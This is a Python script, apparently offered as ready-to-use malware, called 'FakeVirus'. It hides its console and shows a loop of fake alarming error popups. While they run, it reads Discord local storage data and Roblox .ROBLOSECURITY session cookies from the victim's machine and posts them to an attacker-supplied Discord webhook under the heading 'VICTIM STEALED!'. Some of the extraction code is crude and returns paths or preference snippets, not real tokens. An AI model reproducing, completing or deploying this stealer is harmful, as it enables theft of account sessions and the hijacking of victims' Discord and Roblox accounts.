import os
import sys
import time
import threading
import requests
import sqlite3
import json
import random
import shutil
from pathlib import Path

# --- CONFIGURATION ---
# Replace with your Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# Fake error messages to display
ERROR_MESSAGES = [
    "CRITICAL ERROR: Discord Token Lost!",
    "SYSTEM FAILURE: Roblox Cookies Corrupted",
    "WARNING: Your Account is Being Hijacked",
    "ERROR 404: Security Protocol Failed",
    "DISCORD: Update Required - Click OK",
    "ROBLOX: Credit Card Charge Failed",
    "VIRUS DETECTED: Deleting System32...",
    "ATTENTION: Admin Privileges Lost"
]

class FakeVirus:
    def __init__(self):
        self.running = True
        # Suppress console window if run as .pyw
        if hasattr(sys, 'frozen'):
            pass 
        else:
            # Hide console if possible
            try:
                import ctypes
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
            except Exception:
                pass

    def popup_error(self):
        """Simulates a fake error dialog."""
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.withdraw()  # Hide main window
            msg = random.choice(ERROR_MESSAGES)
            messagebox.showerror("System Error", msg)
            root.destroy()
        except Exception:
            pass

    def start_popup_loop(self):
        """Runs popups in a separate thread so it doesn't block stealing."""
        while self.running:
            self.popup_error()
            time.sleep(random.randint(2, 5))  # Pop up every 2-5 seconds

    def get_discord_token(self):
        """Extracts Discord token from LocalStorage/LevelDB."""
        discord_path = os.path.join(os.getenv('LOCALAPPDATA'), "Discord", "app-")
        tokens = []
        
        # Find latest discord version folder
        try:
            dirs = [os.path.join(discord_path, d) for d in os.listdir(discord_path) if os.path.isdir(os.path.join(discord_path, d))]
            if not dirs:
                return None
            
            # Get the most recent directory (sorted by name usually works for versioning)
            latest_dir = sorted(dirs)[-1]
            
            # Look for Local Storage
            local_storage = os.path.join(latest_dir, "Local Storage", "leveldb")
            if os.path.exists(local_storage):
                # This is a simplified extraction. Real ones parse LevelDB files.
                # For simplicity, we'll look for the token in the 'preferences.json' or similar if available,
                # or just grab the whole leveldb folder content as raw data.
                # A more robust way is to read the 'preferences.json' which often contains session info.
                prefs_file = os.path.join(latest_dir, "Local Storage", "preferences.json")
                if os.path.exists(prefs_file):
                    try:
                        with open(prefs_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            # Sometimes token isn't here, but we can grab other data
                            return f"Preferences: {json.dumps(data)[:500]}"
                    except:
                        pass
                
                # Alternative: Try to find token in index.js or similar if accessible
                # But the easiest reliable method for a simple script is checking the 'token' key in memory
                # or using a library like 'discord.py' if installed. 
                # Here we return the path for manual inspection or raw dump.
                return f"Found Discord Data at: {local_storage}"
        except Exception as e:
            return f"Error finding Discord: {str(e)}"
        return None

    def get_roblox_cookie(self):
        """Extracts Roblox cookie from AppData."""
        roblox_data = os.path.join(os.getenv('APPDATA'), "Roblox", "Logs")
        cookies = []
        
        # Roblox stores cookies in various places depending on version.
        # Often found in %LOCALAPPDATA%\Roblox\logs or similar log files.
        # Or in the browser cache if launched via browser.
        
        try:
            # Check common log locations for cookie strings
            paths_to_check = [
                os.path.join(os.getenv('LOCALAPPDATA'), "Roblox", "logs"),
                os.path.join(os.getenv('APPDATA'), "Roblox", "logs")
            ]
            
            for p in paths_to_check:
                if os.path.exists(p):
                    for filename in os.listdir(p):
                        if filename.endswith(".log"):
                            filepath = os.path.join(p, filename)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    if ".ROBLOSECURITY" in content:
                                        # Extract the cookie value roughly
                                        start = content.find(".ROBLOSECURITY=")
                                        if start != -1:
                                            end = content.find(";", start)
                                            if end == -1:
                                                end = len(content)
                                            cookie_val = content[start:end].replace(".ROBLOSECURITY=", "")
                                            cookies.append(cookie_val)
                            except:
                                pass
        except Exception as e:
            return f"Error finding Roblox: {str(e)}"
            
        if cookies:
            return f"Roblox Cookie Found: {cookies[0][:50]}..."
        return "No Roblox Cookie Found in Logs"

    def steal_and_send(self):
        """Main function to collect data and send to webhook."""
        discord_data = self.get_discord_token()
        roblox_data = self.get_roblox_cookie()
        
        payload = {
            "content": "**🔥 VICTIM STEALED! 🔥**",
            "embeds": [{
                "title": "Stolen Data",
                "color": 15158332,
                "fields": [
                    {"name": "Discord Status", "value": discord_data or "Not Found", "inline": False},
                    {"name": "Roblox Status", "value": roblox_data or "Not Found", "inline": False}
                ],
                "footer": {"text": "FakeVirus v1.0"}
            }]
        }
        
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except Exception:
            pass

    def run(self):
        """Starts the virus behavior."""
        # Start popup loop in background
        popup_thread = threading.Thread(target=self.start_popup_loop, daemon=True)
        popup_thread.start()
        
        # Wait a bit then steal data
        time.sleep(5)
        self.steal_and_send()
        
        # Keep running to keep popping errors
        while True:
            time.sleep(1)

if __name__ == "__main__":
    virus = FakeVirus()
    virus.run()